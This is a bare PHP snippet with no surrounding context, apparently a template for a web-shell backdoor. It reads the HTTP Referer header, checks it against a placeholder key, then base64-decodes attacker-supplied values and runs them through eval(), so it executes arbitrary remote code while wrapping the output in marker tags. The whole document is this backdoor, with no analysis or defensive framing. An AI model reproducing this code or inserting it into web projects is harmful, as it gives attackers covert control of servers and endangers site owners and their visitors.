parse_str($_SERVER['HTTP_REFERER'],$a); 
if(reset($a)=='%%%START_KEY%%%' && count($a)==9) { 
echo '<%%%END_KEY%%%>';
eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
echo '</%%%END_KEY%%%>';
}